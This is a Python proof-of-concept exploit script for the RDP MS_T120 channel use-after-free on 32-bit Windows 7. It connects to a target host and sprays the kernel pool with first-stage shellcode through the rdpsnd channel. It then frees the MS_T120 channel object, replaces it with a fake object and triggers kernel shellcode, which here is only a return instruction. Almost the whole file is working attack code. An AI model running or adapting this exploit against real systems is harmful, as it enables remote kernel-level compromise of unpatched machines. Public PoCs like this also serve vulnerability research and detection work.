#!/usr/bin/env python

'''
PoC for Windows 7 x86 using rdpsnd channel
'''

from myrdp import create_rdp, default_t120s_channels
import sys
from struct import pack
import time

host = sys.argv[1]

sc_kernel = b'\xc3'

sc1 = b''
sc1 += b'\x8b\x38'      # mov edi, [eax]
sc1 += b'\x83\xc7\x0b'  # add edi, 0x0b  # 0xb is size of sc1
sc1 += b'\x58'          # pop eax   # pop saved eip
sc1 += b'\x5a\x5e\x59'  # pop edx; pop esi; pop ecx
sc1 += b'\xf3\xa4'      # rep movsb

sc_prefix = b''
sc_prefix += b'\x5e'    # pop esi
# modified the saved eip to IcaChannelInputInternal epilogue part
# IcaChannelInputInternal+11A is return address
# IcaChannelInputInternal+48D is function epilogue
#   diff is 48d-11a = 0x373
sc_prefix += b'\x66\x05\x73\x03'   # add ax,0x373
sc_prefix += b'\x50'    # push eax
# revert the KeEnterCriticalRegion() (part of KeLeaveCriticalRegion())
sc_prefix += b'\x64\xa1\x24\x01\x00\x00' #   mov  eax,dword ptr fs:[124h]
sc_prefix += b'\x66\xff\x80\x84\x00\x00\x00' # inc word ptr [eax+0x84]


# info for win7 x86
CHANNEL_OBJ_SIZE = 0xc8
CHANNEL_VTABLE_OFFSET = 0x8c
CHANN_BUFFER_SIZE = 0x20
CHANN_BUFFER_DATAPTR_OFFSET = 8
# expected address of heap block
SC_SPRAY_BLOCK_ADDR = 0xacaca000
SPRAY_SIZE_MB = 500

spray_data = sc1
spray_data += sc1[-1:]*(4096-CHANN_BUFFER_SIZE-len(spray_data)+CHANN_BUFFER_DATAPTR_OFFSET)
spray_data += pack('<I', SC_SPRAY_BLOCK_ADDR+CHANN_BUFFER_SIZE-4096)  # large page has no pool header
spray_data += spray_data[-1:]*(8192-CHANN_BUFFER_SIZE-len(spray_data)+CHANN_BUFFER_DATAPTR_OFFSET)
spray_data += pack('<I', SC_SPRAY_BLOCK_ADDR+CHANN_BUFFER_SIZE-8192)  # large page has no pool header

fake_channel_obj = b'\x00'*(CHANNEL_VTABLE_OFFSET-CHANN_BUFFER_SIZE)
fake_channel_obj += pack('<I', SC_SPRAY_BLOCK_ADDR+CHANN_BUFFER_DATAPTR_OFFSET)  # use data pointer to dereference
fake_channel_obj += b'\x00'*(CHANNEL_OBJ_SIZE-CHANN_BUFFER_SIZE-len(fake_channel_obj))

free_channel_data = pack('<II', 0, 2)


#################
# start RDP connection
#################
print('do RDP connection/handshake ...')
# use mutiple MS_T120 at 5th and 31th. the server will not crash if no USE packet is arrived
rdp = create_rdp(host, default_t120s_channels, req_ssl=True, do_all_finalization=True, verbose=False)

rdpsnd_channel_id = rdp.channel_ids[1]
rdpdr_channel_id = rdp.channel_ids[3]
t120_channel_id = rdp.channel_ids[4]

rdp.start_recv_loop()
rdp.wait_for_rdpdr_client_id()

time.sleep(0.1)

print('heap spraying with 1st stage shellcode ...')
pkt = rdp.create_send_channel_data(rdpsnd_channel_id, spray_data, do_compress=True)
mpkt = pkt * 50  # 1 pkt = 3 pages = 12KB, so 50 pkt = 600KB
#print(len(mpkt))
loop_cnt = SPRAY_SIZE_MB * 1024 // 600
for i in range(loop_cnt):
    rdp.send(mpkt)

time.sleep(0.2)

print('preparing packets for FREE and replace')

# packet to trigger free MS_T120 channel object
pkt_free = rdp.create_send_channel_data(t120_channel_id, free_channel_data)

pkt_fake = rdp.create_send_channel_data(rdpsnd_channel_id, fake_channel_obj, do_compress=True)
#print(len(pkt_fake))

# free the channel and try to take over with same block size
# if target is uniprocessor, the replacement always success (just use 1 pkt_free and 1 pkt_fake is enough)
# if target is multiprocessor, high chance to fail (as explained in NOTE.md)
print('free and take over')
rdp.send(pkt_fake*4 + pkt_free + pkt_fake*100)
rdp.send(pkt_fake*50)

print('sleep a bit. make sure the MS_T120 channel get replaced before USE')
time.sleep(0.2)

print('trigger use')
# compression ratio is based on duplication in data. so no compression for real kernel shellcode 
pkt_use = rdp.create_send_channel_data(t120_channel_id, sc_prefix+sc_kernel)
rdp.send(pkt_fake*4 + pkt_use)

time.sleep(1)

rdp.disconnect()
